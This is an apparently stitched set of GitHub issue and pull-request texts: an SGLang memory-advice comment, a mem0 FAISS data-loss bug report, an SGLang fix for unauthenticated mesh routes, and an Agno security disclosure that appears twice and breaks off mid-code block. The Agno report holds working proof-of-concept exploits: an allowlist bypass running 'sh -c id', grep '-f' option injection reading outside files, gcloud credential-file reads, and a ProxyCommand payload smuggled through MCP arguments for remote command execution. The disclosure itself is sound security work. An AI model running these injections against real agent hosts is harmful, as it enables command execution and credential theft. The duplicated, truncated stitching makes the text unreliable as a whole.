Thanks for the detailed report and the root-cause analysis — the misleading `--mem-fraction-static` advice when the Mamba state cache is what exhausts memory is a real usability trap for hybrid-model serving.

I'd like to take this one. My plan: in `_profile_available_bytes` (`python/sglang/srt/mem_cache/kv_cache_configurator.py`), detect the case where `rest_memory` is positive before `_handle_max_mamba_cache` and non-positive after it, and in that case report the Mamba state size and suggest lowering `--max-running-requests` (or the Mamba cache sizing options), keeping the current `--mem-fraction-static` advice for the weights-only case.

issue.title: FAISS: a payload with a datetime or numpy value truncates the docstore JSON, and every memory in the collection is lost on restart

labels.name: repo-9eafe629
labels.description: Vector store backends (Qdrant, PGVector, Redis, etc.)

issue.body:
### Component

Vector Store

### Description

### Summary

`FAISS.insert()` accepts payloads that can't be JSON-serialized (a `datetime`, a numpy scalar like `np.float32`). `_save()` (faiss.py:241-263) writes the `.faiss` index first, then `json.dump`s straight into the live `<collection>.json`; the dump fails partway, leaving a truncated file, and the exception is only logged as a warning. In-process reads keep working, so nothing looks wrong — but on the next start `_load()` fails and the docstore comes back empty, for every user in the collection, while the index still holds all the vectors.

This is related to #7117, which covers recovery when `_load()` fails and making `_save()` atomic. Atomic writes alone don't cover this case though: once the bad payload is in the in-memory docstore, every later `_save()` fails too, so all writes after it silently stop persisting. The bad value needs to be rejected (or converted) before it reaches the docstore.

### Steps to Reproduce

```python
import os, tempfile
from datetime import datetime, timezone
os.environ["MEM0_TELEMETRY"] = "False"
from mem0.vector_stores.faiss import FAISS

path = tempfile.mkdtemp()
store = FAISS(collection_name="memories", path=path, embedding_model_dims=4)
store.insert([[0.1, 0.2, 0.3, 0.4]], payloads=[{"data": "bob likes tea", "user_id": "bob"}], ids=["bob-1"])
store.insert([[0.2, 0.1, 0.4, 0.3]], payloads=[{"data": "bob lives in Paris", "user_id": "bob"}], ids=["bob-2"])
store.insert([[0.4, 0.3, 0.2, 0.1]],
             payloads=[{"data": "alice note", "user_id": "alice", "seen_at": datetime(2026, 1, 1, tzinfo=timezone.utc)}],
             ids=["alice-1"])
print("before restart: docstore =", len(store.docstore), "| index.ntotal =", store.index.ntotal)

reopened = FAISS(collection_name="memories", path=path, embedding_model_dims=4)
print("after restart:  docstore =", len(reopened.docstore), "| index.ntotal =", reopened.index.ntotal)
print("bob-1 after restart:", reopened.get("bob-1"))
```

Through `Memory`, `m.add(..., infer=False, metadata={"seen_at": datetime.now()})` hits the same path and still returns `event: ADD`.

### Expected Behavior

The insert with an unserializable value is rejected (or the value converted), and other users' memories survive a restart.

### Actual Behavior

```
Failed to save FAISS index: Object of type datetime is not JSON serializable
Failed to load FAISS index: Expecting value: line 14 column 18 (char 263)
before restart: docstore = 3 | index.ntotal = 3
after restart:  docstore = 0 | index.ntotal = 3
bob-1 after restart: None
```

### Environment

- mem0 version: 2.2.1 (main @ 753496c), faiss-cpu
- Python version: 3.11
- OS: Linux

### How You Verified This

### What I Ran

The script above, run in a fresh venv with `pip install "git+https://github.com/mem0ai/mem0" faiss-cpu`.

### What I Saw

Pasted under Actual Behavior: bob's two memories are gone after reopening, and the index still has all 3 vectors.

### Why This Is a Bug

A different user's record wipes bob's memories, and the caller of the bad insert gets no error. `_save()` swallows the exception, so the only sign is a warning log line.

### What I Ruled Out

- Also happens with `np.float32` as the value, not just `datetime`.
- Separate from #7117: that's about recovering from a damaged file; this is about what produces one, and about later saves continuing to fail even if the write itself were atomic.

### AI Assistance

AI found and wrote this, and I have not reproduced it myself

comment.body:
Hi, thank you for the detailed report and the runnable reproducer — losing every memory in a collection on restart because of one unserializable payload is a serious data-loss bug, and I appreciate you distinguishing it from #7117 (this is about rejecting/converting the bad value before it reaches the docstore, not just recovering afterwards).

I'd like to take this one: validate payload JSON-serializability in `FAISS.insert()` (rejecting or converting values like `datetime`/numpy scalars) so a bad insert fails loudly instead of silently poisoning later saves. Happy to adjust the approach if maintainers prefer conversion over rejection.

issue.title: [Fix] Require control-plane auth on mesh HA management routes (fixes #45006)
issue.body:
## Summary

Mesh HA management routes (`/ha/*`) in `sgl-model-gateway` were protected only by the data-plane `auth_middleware` (Bearer == `--api-key`), which performs no role check. In a deployment with `--enable-mesh`, a data-plane API key, and control-plane RBAC (`--control-plane-api-keys`), any holder of the data-plane key could read cluster state/topology, write config entries that gossip to every peer, change the global rate limit, and trigger a graceful mesh leave — while the genuine control-plane Admin credential was rejected with 401 on the same routes.

This change wraps `mesh_routes` with the same `apply_control_plane_auth` already used for `admin_routes`/`worker_routes`: when control-plane RBAC is configured, only Admins can reach `/ha/*`; when it is not configured, the wiring falls back to the data-plane API key check, so behavior is unchanged.

Thank you @yyymk for the thorough report and the public disclosure — the reproduction steps and the control experiment made the intended fix direction clear.

Fixes #45006.

## Root cause

In `sgl-model-gateway/src/server.rs::build_app`, `admin_routes` and `worker_routes` go through `apply_control_plane_auth` (control-plane middleware when `--control-plane-api-keys`/JWT is configured, otherwise the data-plane fallback), but `mesh_routes` was attached only to `middleware::auth_middleware`, which checks the Bearer token against `--api-key` and does no role check.

## Change

```diff
-    // HA management routes
+    // HA management routes (control-plane authorization: Admin only when
+    // control-plane RBAC is configured, otherwise plain data-plane API key).
     let mesh_routes = Router::new()
         .route("/ha/status", get(get_cluster_status))
         ...
-        .route("/ha/shutdown", post(trigger_graceful_shutdown))
-        .route_layer(axum::middleware::from_fn_with_state(
-            auth_config.clone(),
-            middleware::auth_middleware,
-        ));
+        .route("/ha/shutdown", post(trigger_graceful_shutdown));
+    let mesh_routes = apply_control_plane_auth(mesh_routes);
```

## Reproduction

Verified on current main (commit `4ec19ca`), built with Rust 1.90.0. Two mesh routers plus one mock worker, all on 127.0.0.1, following the issue's topology:

```bash
# mock worker on 127.0.0.1:39990 (see issue for mock_worker.py)
sgl-model-gateway \
  --host 127.0.0.1 --port 33800 --policy round_robin \
  --worker-urls http://127.0.0.1:39990 \
  --worker-startup-timeout-secs 5 --disable-health-check --log-level info \
  --api-key user-secret \
  --control-plane-api-keys admin1:Admin:admin:admin-secret \
  --control-plane-api-keys user1:User:user:user-secret \
  --enable-mesh --mesh-server-name R1 \
  --mesh-host 127.0.0.1 --mesh-port 39530 --mesh-peer-urls 127.0.0.1:39531
# second router identical with --port 33801, --mesh-server-name R2, mesh :39531 -> peer 127.0.0.1:39530
```

Note: on current main, `/ha/config` values must be hex-encoded (hence `deadbeef`/`cafebabe` below); the 0.3.2 behavior in the issue accepted arbitrary strings.

### Before (unfixed binary)

```
=== [BEFORE] boundary (must be identical before/after) ===
POST /v1/completions user -> 200
GET /workers user -> 403
GET /workers admin -> 200
=== [BEFORE] /ha/* reads ===
GET /ha/status : user -> 200 | admin -> 401
GET /ha/health : user -> 200 | admin -> 401
GET /ha/workers : user -> 200 | admin -> 401
GET /ha/policies : user -> 200 | admin -> 401
GET /ha/rate-limit/stats : user -> 200 | admin -> 401
=== [BEFORE] /ha/* writes ===
POST /ha/rate-limit user -> 200
POST /ha/rate-limit admin -> 401
POST /ha/config user (hex value deadbeef) -> 200
POST /ha/config admin (hex value cafebabe) -> 401
```

The user-credential write persisted and was readable back on the same node:

```
$ curl -s http://127.0.0.1:33800/ha/config/authz_probe_BEFORE -H 'Authorization: Bearer user-secret'
{"key":"authz_probe_BEFORE","value":"deadbeef","format":"hex"}
```

And it gossiped to the peer — R2's mesh log shows R1's `NodeState.metadata` carrying the probe key (`deadbeef` = bytes `[222, 173, 190, 239]`):

```
smg_mesh::ping_server: ... Received Ping { state_sync: Some(StateSync { nodes: [
  NodeState { name: "R1", address: "127.0.0.1:39530", status: Alive, version: 4,
    metadata: {"global_rate_limit": [...], "authz_probe_BEFORE": [222, 173, 190, 239]} },
  ... ] }) }
```

### After (this PR)

```
=== [AFTER] boundary (must be identical before/after) ===
POST /v1/completions user -> 200
GET /workers user -> 403
GET /workers admin -> 200
=== [AFTER] /ha/* reads ===
GET /ha/status : user -> 403 | admin -> 200
GET /ha/health : user -> 403 | admin -> 200
GET /ha/workers : user -> 403 | admin -> 200
GET /ha/policies : user -> 403 | admin -> 200
GET /ha/rate-limit/stats : user -> 403 | admin -> 200
=== [AFTER] /ha/* writes ===
POST /ha/rate-limit user -> 403
POST /ha/rate-limit admin -> 200
POST /ha/config user (hex value deadbeef) -> 403
POST /ha/config admin (hex value cafebabe) -> 200
```

Admin round-trips still work end to end:

```
$ curl -s http://127.0.0.1:33800/ha/config/authz_probe_admin_AFTER -H 'Authorization: Bearer admin-secret'
{"key":"authz_probe_admin_AFTER","value":"cafebabe","format":"hex"}
$ curl -s http://127.0.0.1:33800/ha/rate-limit -H 'Authorization: Bearer admin-secret'
{"limit_per_second":9}
```

## Regression checks

- **Mesh peering intact** (gossip runs over the smg-mesh TCP protocol on the mesh port, never through the `/ha/*` HTTP routes; no in-repo HTTP caller of `/ha/*` exists). With the fix, both nodes see the full cluster:
  ```
  $ curl -s http://127.0.0.1:33800/ha/status -H 'Authorization: Bearer admin-secret'
  {"node_name":"R1","node_count":2,"nodes":[{"name":"R1","address":"127.0.0.1:39530",...},
   {"name":"R2","address":"127.0.0.1:39531",...}],"stores":{"membership_count":2,...}}
  $ curl -s http://127.0.0.1:33800/ha/health -H 'Authorization: Bearer admin-secret'
  {"status":"healthy","node_name":"R1","cluster_size":2,"stores_healthy":true}
  ```
- **Public health probes untouched** (`/liveness`, `/readiness`, `/health`, `/health_generate` are in `public_routes`): `GET /liveness` and `GET /health` return 200 with no credentials, before and after.
- **Inference path untouched**: `POST /v1/completions` with the data-plane key returns 200, before and after. (`/ha/health` is a mesh-topology management view, not the liveness probe.)
- **No control-plane RBAC configured**: `apply_control_plane_auth` falls back to the plain data-plane `auth_middleware`, so deployments without `--control-plane-api-keys`/JWT see no behavior change.

## Tests

- `cargo test --test security_tests` (sgl-model-gateway): **47 passed, 1 failed**. The single failure is `common::redis_test_server::tests::test_redis_server_start_stop`, which spawns an external `redis-server` binary that is not installed in this environment — unrelated to this change.
- Live two-router mesh verification matrix above (before/after), covering reads, state-changing writes, gossip propagation, admin round-trips, public probes, and peer connectivity.

<!-- pr-states:start -->
---
### CI States

Latest PR Test (Base): <!-- slot:pr-test:start -->:white_check_mark: [Run #39146067828](https://github.com/sgl-project/sglang/actions/runs/39146067828)<!-- slot:pr-test:end -->
Latest PR Test (Extra): <!-- slot:pr-test-extra:start -->:x: [Run #39146067720](https://github.com/sgl-project/sglang/actions/runs/39146067720)<!-- slot:pr-test-extra:end -->
Latest PR Test (AMD ROCm 10): <!-- slot:pr-test-amd:start -->:heavy_minus_sign: **No AMD PR run found for this commit**.<!-- slot:pr-test-amd:end -->
<!-- pr-states:end -->

issue.title: [Security] Command Allowlist Bypass and Argument Injection in MCPTools, CodingTools.grep, and Workspace
issue.body:
### Description

## Summary

Command allowlist bypass and argument/option injection vulnerabilities exist in Agno's `MCPTools`, `CodingTools`, and `Workspace` toolkits. Untrusted input reaching these tools can bypass `ALLOWED_COMMANDS` in `prepare_command()`, inject `grep` flags (`-f`) to read files outside `base_dir`, read unexcluded `.config/gcloud` token databases, or pass unvalidated OpenSSH `ProxyCommand` flags through CLI-backed MCP tools to execute arbitrary OS commands on the host.

## Affected Component

- **File 1**: `libs/agno/agno/utils/mcp.py`
  - **Method**: `prepare_command(command)` (lines 377–460) & `get_entrypoint_for_tool()` (lines 163–195)
  - **Code**: `if shutil.which(executable): return parts` (line 431, before `if executable not in ALLOWED_COMMANDS:` at line 434)
- **File 2**: `libs/agno/agno/tools/coding.py`
  - **Method**: `CodingTools.grep(pattern, path, ...)` (lines 673–745)
  - **Code**: `cmd.append(pattern)` without `"-e"` or `"--"`
  - **Sink**: `subprocess.run(["grep", "-rn", pattern, str(resolved_path)], ...)`
- **File 3**: `libs/agno/agno/tools/_local_file_utils.py`
  - **Constant**: `DEFAULT_EXCLUDE_PATTERNS` (lines 64–135)
- **File 4**: `libs/agno/agno/tools/mcp/mcp.py`
  - **Method**: `MCPTools.build_tools()` (lines 944–952)

## Vulnerability Details

### 1. `prepare_command()` Bypasses `ALLOWED_COMMANDS` (`libs/agno/agno/utils/mcp.py:431-435`)
`prepare_command` defines `ALLOWED_COMMANDS`, but checks `shutil.which(executable)` first and returns early:

```python
# Check if it's a binary in PATH
if shutil.which(executable):
    return parts

if executable not in ALLOWED_COMMANDS:
    raise ValueError(f"MCP command needs to use one of the following executables: {ALLOWED_COMMANDS}")
```

Because `shutil.which()` returns a truthy path for any installed binary on `PATH` (`sh`, `bash`, `cmd`, `curl`), line 434 is unreachable for `PATH` binaries. Note: lines 416–428 also return early for `./`, `../`, and `/` paths, and line 384 omits `\n` and `\r`.

### 2. `CodingTools.grep()` Option Injection (`libs/agno/agno/tools/coding.py:709-725`)
`grep()` checks `path` against `self.base_dir`, but appends `pattern` directly to `cmd` without `-e` or `--`:

```python
cmd = ["grep", "-rn"]
...
cmd.append(pattern)
cmd.append(str(resolved_path))
result = subprocess.run(cmd, capture_output=True, text=True, timeout=30, cwd=str(self.base_dir))
```

Passing `pattern="-f/etc/passwd"` causes `grep` to interpret `pattern` as `--file=` and read files outside `self.base_dir` even when `restrict_to_base_dir=True`.

### 3. Missing `gcloud` Credential Exclusions in `DEFAULT_EXCLUDE_PATTERNS` (`libs/agno/agno/tools/_local_file_utils.py:64-135`)
`DEFAULT_EXCLUDE_PATTERNS` blocks `.aws`, `.azure`, `.kube`, `.docker`, and `.ssh`, but omits `gcloud`, `credentials.db`, `access_tokens.db`, and `application_default_credentials.json`.

### 4. Unvalidated MCP CLI Argument Forwarding (`libs/agno/agno/tools/mcp/mcp.py:944-952`)
`MCPTools.build_tools()` sets `skip_entrypoint_processing=True` and `requires_confirmation=False` by default, forwarding `kwargs` verbatim to `active_session.call_tool(tool_name, kwargs)`. When paired with a CLI wrapper MCP server (e.g. `@google-cloud/gcloud-mcp`), injected `args` containing space-smuggled tokens (`"--project=prod-1 version"`) or local proxy-execution flags (`--ssh-flag=-oProxyCommand=...`) execute host OS commands via local `ssh`.

### Steps to Reproduce

## Proof of Concept

### Environment

| Component | Version |
|-----------|---------|
| agno | 3.1.9 / 3.1.12 |
| mcp / fastmcp | 2.x / 4.1.3 |
| @google-cloud/gcloud-mcp | 0.5.3 |

### `poc.py` (Issues 1–3)

```python
#!/usr/bin/env python3
import os, tempfile
from pathlib import Path
from agno.utils.mcp import prepare_command
from agno.tools.coding import CodingTools
from agno.tools.workspace import Workspace

# [1] prepare_command() bypasses ALLOWED_COMMANDS for any binary on PATH
cmd = "cmd /c whoami" if os.name == "nt" else "sh -c id"
parts = prepare_command(cmd)
print(f"[1] prepare_command({cmd!r}) -> {parts}")
assert parts[0] in ("cmd", "sh")

# [2] CodingTools.grep() -f flag injection reads outside base_dir
with tempfile.TemporaryDirectory() as base, tempfile.TemporaryDirectory() as outside:
    secret = Path(outside) / "secret.txt"
    secret.write_text("TOP_SECRET_TOKEN_999\n")
    (Path(base) / "file.txt").write_text("line with TOP_SECRET_TOKEN_999\n")

    coding = CodingTools(base_dir=Path(base), restrict_to_base_dir=True)
    out = coding.grep(pattern=f"-f{secret}")
    print(f"[2] grep(pattern='-f<outside>') -> {out.strip()}")
    assert "TOP_SECRET_TOKEN_999" in out

# [3] Workspace reads .config/gcloud/credentials.db while blocking .aws/credentials
with tempfile.TemporaryDirectory() as home:
    home_dir = Path(home)
    (home_dir / ".aws").mkdir()
    (home_dir / ".aws/credentials").write_text("aws_secret = XXX\n")
    gcloud_dir = home_dir / ".config/gcloud"
    gcloud_dir.mkdir(parents=True)
    (gcloud_dir / "credentials.db").write_text("SQLITE_GCLOUD_OAUTH_REFRESH_TOKEN\n")

    ws = Workspace(home_dir)
    print(f"[3a] .aws/credentials -> {ws.read_file('.aws/credentials')}")
    print(f"[3b] .config/gcloud/credentials.db -> {ws.read_file('.config/gcloud/credentials.db').strip()}")
```

### `poc_mcp_rce.py` (Issue 4 — E2E MCP CLI RCE)

Connects `MCPTools` to the real, unmodified `@google-cloud/gcloud-mcp` from the public npm registry. The `gcloud` binary on `PATH` is a recording shim so no cloud account is needed:

```python
#!/usr/bin/env python3
import asyncio, os, stat, tempfile
from pathlib import Path
from agno.tools.mcp import MCPTools

GCLOUD_SHIM = """#!/usr/bin/env python3
import json, subprocess, sys
args = sys.argv[1:]
if args[:2] == ["meta", "lint-gcloud-commands"]:
    tokens = [t for t in args[3].split()[1:] if not t.startswith("--")]
    sub = " ".join(tokens[:2]) if tokens[:1] == ["compute"] else (tokens[0] if tokens else "")
    print(json.dumps([{"command_string_no_args": ("gcloud " + sub).strip(), "success": True, "error_message": None, "error_type": None}]))
    sys.exit(0)
for t in args:
    if t.startswith(("--scp-flag=", "--ssh-flag=")):
        subprocess.run(["ssh", t.split("=", 1)[1], "127.0.0.1"], capture_output=True, timeout=5)
"""

async def main():
    with tempfile.TemporaryDirectory() as tmp:
        tmp_path = Path(tmp)
        marker = tmp_path / "rce_marker.txt"
        shim = tmp_path / "gcloud"
        shim.write_text(GCLOUD_SHIM)
        shim.chmod(shim.stat().st_mode | stat.S_IEXEC)
        os.environ["PATH"] = f"{tmp_path}{os.pathsep}{os.environ.get('PATH', '')}"

        async with MCPTools(command="npx -y @google-cloud/gcloud-mcp") as mcp_tools:
            fn = mcp_tools.functions["run_gcloud_command"]
            print(f"[MCPTools] requires_confirmation={fn.requires_confirmation}")

            # 1. Sanity: a plain allowed command runs.
            print("[sanity]", await fn.entrypoint(args=["version"]))

            # 2. Naive attempt: the server's own denylist blocks direct `compute ssh`.
            print("[deny-check]", await fn.entrypoint(
                args=["compute", "ssh", "instance-1",
                      f"--ssh-flag=-oProxyCommand=sh -c 'id > {marker}'"]))

            # 3. Attack: one array element with an embedded space. The server joins
            # and lints the string as `gcloud version` (allowed), while the CLI
            # receives the raw array and runs `compute ssh` with the payload.
            await fn.entrypoint(
                args=["--project=prod-1 version", "compute", "ssh", "instance-1",
                      f"--ssh-flag=-oProxyCommand=sh -c 'id > {marker}'"])
            print(f"[attack] marker exists={marker.exists()} -> "
                  f"{marker.read_text().strip() if marker.exists() else 'N/A'}")

asyncio.run(main())
```

### Agent Configuration (if applicable)

```python
from pathlib import Path
from agno.agent import Agent
from agno.tools.coding import CodingTools
from agno.tools.mcp import MCPTools
from agno.tools.workspace import Workspace

tools = [
    MCPTools(command="npx -y @google-cloud/gcloud-mcp"),
    CodingTools(base_dir=Path("./workspace"), restrict_to_base_dir=True),
    Workspace(Path.home(), allowed=["read", "list", "search"]),
]
```

### Expected Behavior

1. `prepare_command()` should enforce `executable in ALLOWED_COMMANDS` before returning, and reject `\n` / `\r`.
2. `CodingTools.grep()` should pass `"-e", pattern, "--", str(resolved_path)` so patterns starting with `"-"` are never parsed as flags by `grep`.
3. `DEFAULT_EXCLUDE_PATTERNS` should include `gcloud`, `credentials.db`, `access_tokens.db`, and `application_default_credentials.json`.
4. `MCPTools` should validate or require confirmation before forwarding CLI flag arrays containing multi-token strings or `-oProxyCommand`.

### Actual Behavior

### Mechanics

```python
# 1. prepare_command allowlist bypass:
prepare_command("sh -c id")
# Returns: ['sh', '-c', 'id'] (bypasses ALLOWED_COMMANDS via shutil.which at line 431)

# 2. CodingTools.grep flag injection:
coding.grep(pattern="-f/outside/secret.txt")
# Executes: grep -rn -f/outside/secret.txt /app/workspace (reads outside base_dir)

# 3. MCPTools CLI array forwarding:
run_gcloud_command(args=["--project=prod-1 version", "compute", "ssh", "instance-1", "--ssh-flag=-oProxyCommand=sh -c 'id > /tmp/pwn'"])
# The server lints the joined string as `gcloud version` (allowed) but passes the
# raw array to the CLI, which runs `compute ssh` and the ProxyCommand payload,
# with no confirmation requested by agno
```

## Impact

- Arbitrary OS command execution on the agent host via `prepare_command()` bypass or `MCPTools` CLI flag forwarding
- Arbitrary file disclosure outside `base_dir` via `CodingTools.grep(pattern="-f...")`
- Local GCP OAuth refresh/access token theft via `Workspace.read_file(".config/gcloud/credentials.db")`

## Affected Versions

- Confirmed on: **agno 3.1.9** and **agno 3.1.12** (latest `main`)

### Screenshots or Logs (if applicable)

```log
$ python3 poc.py
[1] prepare_command('sh -c id') -> ['sh', '-c', 'id']
[2] grep(pattern='-f<outside>') -> file.txt:1:line with TOP_SECRET_TOKEN_999
[3a] .aws/credentials -> Error: path is excluded from this workspace: .aws/credentials
[3b] .config/gcloud/credentials.db -> SQLITE_GCLOUD_OAUTH_REFRESH_TOKEN

[attack] args=["--project=prod-1 version", "compute", "ssh", "instance-1", "--ssh-flag=-oProxyCommand=sh -c 'echo REAL_E2E_RCE_VIA_GCLOUD_MCP > /tmp/agno_real_e2e_marker.txt'"]
[attack] marker exists: True -> REAL_E2E_RCE_VIA_GCLOUD_MCP
```

```markdown
- agno version: 3.1.9 / 3.1.12
- mcp / fastmcp version: 2.x / 4.1.3
- @google-cloud/gcloud-mcp: 0.5.3
- Python: 3.12
- OS: Linux (Docker python:3.12-slim)
```

## Remediation

```python

if any(char in command for char in ["&", "|", ";", "`", "$", "(", ")", "\n", "\r"]):

...
executable = parts[0].split("/")[-1]

# 3. libs/agno/agno/tools/_local_file_utils.py — add gcloud to DEFAULT_EXCLUDE_PATTERNS:
# Add "gcloud", "credentials.db", "access_tokens.db", "application_default_credentials.json"
```

issue.title: [Security] Command Allowlist Bypass and Argument Injection in MCPTools, CodingTools.grep, and Workspace
issue.body:
### Description

## Summary

Command allowlist bypass and argument/option injection vulnerabilities exist in Agno's `MCPTools`, `CodingTools`, and `Workspace` toolkits. Untrusted input reaching these tools can bypass `ALLOWED_COMMANDS` in `prepare_command()`, inject `grep` flags (`-f`) to read files outside `base_dir`, read unexcluded `.config/gcloud` token databases, or pass unvalidated OpenSSH `ProxyCommand` flags through CLI-backed MCP tools to execute arbitrary OS commands on the host.

## Affected Component

- **File 1**: `libs/agno/agno/utils/mcp.py`
  - **Method**: `prepare_command(command)` (lines 377–460) & `get_entrypoint_for_tool()` (lines 163–195)
  - **Code**: `if shutil.which(executable): return parts` (line 431, before `if executable not in ALLOWED_COMMANDS:` at line 434)
- **File 2**: `libs/agno/agno/tools/coding.py`
  - **Method**: `CodingTools.grep(pattern, path, ...)` (lines 673–745)
  - **Code**: `cmd.append(pattern)` without `"-e"` or `"--"`
  - **Sink**: `subprocess.run(["grep", "-rn", pattern, str(resolved_path)], ...)`
- **File 3**: `libs/agno/agno/tools/_local_file_utils.py`
  - **Constant**: `DEFAULT_EXCLUDE_PATTERNS` (lines 64–135)
- **File 4**: `libs/agno/agno/tools/mcp/mcp.py`
  - **Method**: `MCPTools.build_tools()` (lines 944–952)

## Vulnerability Details

### 1. `prepare_command()` Bypasses `ALLOWED_COMMANDS` (`libs/agno/agno/utils/mcp.py:431-435`)
`prepare_command` defines `ALLOWED_COMMANDS`, but checks `shutil.which(executable)` first and returns early:

```python
# Check if it's a binary in PATH
if shutil.which(executable):
    return parts

if executable not in ALLOWED_COMMANDS:
    raise ValueError(f"MCP command needs to use one of the following executables: {ALLOWED_COMMANDS}")
```

Because `shutil.which()` returns a truthy path for any installed binary on `PATH` (`sh`, `bash`, `cmd`, `curl`), line 434 is unreachable for `PATH` binaries. Note: lines 416–428 also return early for `./`, `../`, and `/` paths, and line 384 omits `\n` and `\r`.

### 2. `CodingTools.grep()` Option Injection (`libs/agno/agno/tools/coding.py:709-725`)
`grep()` checks `path` against `self.base_dir`, but appends `pattern` directly to `cmd` without `-e` or `--`:

```python
cmd = ["grep", "-rn"]
...
cmd.append(pattern)
cmd.append(str(resolved_path))
result = subprocess.run(cmd, capture_output=True, text=True, timeout=30, cwd=str(self.base_dir))
```

Passing `pattern="-f/etc/passwd"` causes `grep` to interpret `pattern` as `--file=` and read files outside `self.base_dir` even when `restrict_to_base_dir=True`.

### 3. Missing `gcloud` Credential Exclusions in `DEFAULT_EXCLUDE_PATTERNS` (`libs/agno/agno/tools/_local_file_utils.py:64-135`)
`DEFAULT_EXCLUDE_PATTERNS` blocks `.aws`, `.azure`, `.kube`, `.docker`, and `.ssh`, but omits `gcloud`, `credentials.db`, `access_tokens.db`, and `application_default_credentials.json`.

### 4. Unvalidated MCP CLI Argument Forwarding (`libs/agno/agno/tools/mcp/mcp.py:944-952`)
`MCPTools.build_tools()` sets `skip_entrypoint_processing=True` and `requires_confirmation=False` by default, forwarding `kwargs` verbatim to `active_session.call_tool(tool_name, kwargs)`. When paired with a CLI wrapper MCP server (e.g. `@google-cloud/gcloud-mcp`), injected `args` containing space-smuggled tokens (`"--project=prod-1 version"`) or local proxy-execution flags (`--ssh-flag=-oProxyCommand=...`) execute host OS commands via local `ssh`.

### Steps to Reproduce

## Proof of Concept

### Environment

| Component | Version |
|-----------|---------|
| agno | 3.1.9 / 3.1.12 |
| mcp / fastmcp | 2.x / 4.1.3 |
| @google-cloud/gcloud-mcp | 0.5.3 |

### `poc.py` (Issues 1–3)

```python
#!/usr/bin/env python3
import os, tempfile
from pathlib import Path
from agno.utils.mcp import prepare_command
from agno.tools.coding import CodingTools
from agno.tools.workspace import Workspace

# [1] prepare_command() bypasses ALLOWED_COMMANDS for any binary on PATH
cmd = "cmd /c whoami" if os.name == "nt" else "sh -c id"
parts = prepare_command(cmd)
print(f"[1] prepare_command({cmd!r}) -> {parts}")
assert parts[0] in ("cmd", "sh")

# [2] CodingTools.grep() -f flag injection reads outside base_dir
with tempfile.TemporaryDirectory() as base, tempfile.TemporaryDirectory() as outside:
    secret = Path(outside) / "secret.txt"
    secret.write_text("TOP_SECRET_TOKEN_999\n")
    (Path(base) / "file.txt").write_text("line with TOP_SECRET_TOKEN_999\n")

    coding = CodingTools(base_dir=Path(base), restrict_to_base_dir=True)
    out = coding.grep(pattern=f"-f{secret}")
    print(f"[2] grep(pattern='-f<outside>') -> {out.strip()}")
    assert "TOP_SECRET_TOKEN_999" in out

# [3] Workspace reads .config/gcloud/credentials.db while blocking .aws/credentials
with tempfile.TemporaryDirectory() as home:
    home_dir = Path(home)
    (home_dir / ".aws").mkdir()
    (home_dir / ".aws/credentials").write_text("aws_secret = XXX\n")
    gcloud_dir = home_dir / ".config/gcloud"
    gcloud_dir.mkdir(parents=True)
    (gcloud_dir / "credentials.db").write_text("SQLITE_GCLOUD_OAUTH_REFRESH_TOKEN\n")

    ws = Workspace(home_dir)
    print(f"[3a] .aws/credentials -> {ws.read_file('.aws/credentials')}")
    print(f"[3b] .config/gcloud/credentials.db -> {ws.read_file('.config/gcloud/credentials.db').strip()}")
```

### `poc_mcp_rce.py` (Issue 4 — E2E MCP CLI RCE)

Connects `MCPTools` to the real, unmodified `@google-cloud/gcloud-mcp` from the public npm registry. The `gcloud` binary on `PATH` is a recording shim so no cloud account is needed:

```python
#!/usr/bin/env python3
import asyncio, os, stat, tempfile
from pathlib import Path
from agno.tools.mcp import MCPTools

GCLOUD_SHIM = """#!/usr/bin/env python3
import json, subprocess, sys
args = sys.argv[1:]
if args[:2] == ["meta", "lint-gcloud-commands"]:
    tokens = [t for t in args[3].split()[1:] if not t.startswith("--")]
    sub = " ".join(tokens[:2]) if tokens[:1] == ["compute"] else (tokens[0] if tokens else "")
    print(json.dumps([{"command_string_no_args": ("gcloud " + sub).strip(), "success": True, "error_message": None, "error_type": None}]))
    sys.exit(0)
for t in args:
    if t.startswith(("--scp-flag=", "--ssh-flag=")):
        subprocess.run(["ssh", t.split("=", 1)[1], "127.0.0.1"], capture_output=True, timeout=5)
"""

async def main():
    with tempfile.TemporaryDirectory() as tmp:
        tmp_path = Path(tmp)
        marker = tmp_path / "rce_marker.txt"
        shim = tmp_path / "gcloud"
        shim.write_text(GCLOUD_SHIM)
        shim.chmod(shim.stat().st_mode | stat.S_IEXEC)
        os.environ["PATH"] = f"{tmp_path}{os.pathsep}{os.environ.get('PATH', '')}"

        async with MCPTools(command="npx -y @google-cloud/gcloud-mcp") as mcp_tools:
            fn = mcp_tools.functions["run_gcloud_command"]
            print(f"[MCPTools] requires_confirmation={fn.requires_confirmation}")

            # 1. Sanity: a plain allowed command runs.
            print("[sanity]", await fn.entrypoint(args=["version"]))

            # 2. Naive attempt: the server's own denylist blocks direct `compute ssh`.
            print("[deny-check]", await fn.entrypoint(
                args=["compute", "ssh", "instance-1",
                      f"--ssh-flag=-oProxyCommand=sh -c 'id > {marker}'"]))

            # 3. Attack: one array element with an embedded space. The server joins
            # and lints the string as `gcloud version` (allowed), while the CLI
            # receives the raw array and runs `compute ssh` with the payload.
            await fn.entrypoint(
                args=["--project=prod-1 version", "compute", "ssh", "instance-1",
                      f"--ssh-flag=-oProxyCommand=sh -c 'id > {marker}'"])
            print(f"[attack] marker exists={marker.exists()} -> "
                  f"{marker.read_text().strip() if marker.exists() else 'N/A'}")

asyncio.run(main())
```

### Agent Configuration (if applicable)

```python
from pathlib import Path
from agno.agent import Agent
from agno.tools.coding import CodingTools
from agno.tools.mcp import MCPTools
from agno.tools.workspace import Workspace

tools = [
    MCPTools(command="npx -y @google-cloud/gcloud-mcp"),
    CodingTools(base_dir=Path("./workspace"), restrict_to_base_dir=True),
    Workspace(Path.home(), allowed=["read", "list", "search"]),
]
```

### Expected Behavior

1. `prepare_command()` should enforce `executable in ALLOWED_COMMANDS` before returning, and reject `\n` / `\r`.
2. `CodingTools.grep()` should pass `"-e", pattern, "--", str(resolved_path)` so patterns starting with `"-"` are never parsed as flags by `grep`.
3. `DEFAULT_EXCLUDE_PATTERNS` should include `gcloud`, `credentials.db`, `access_tokens.db`, and `application_default_credentials.json`.
4. `MCPTools` should validate or require confirmation before forwarding CLI flag arrays containing multi-token strings or `-oProxyCommand`.

### Actual Behavior

### Mechanics

```python
# 1. prepare_command allowlist bypass:
prepare_command("sh -c id")
# Returns: ['sh', '-c', 'id'] (bypasses ALLOWED_COMMANDS via shutil.which at line 431)

# 2. CodingTools.grep flag injection:
coding.grep(pattern="-f/outside/secret.txt")
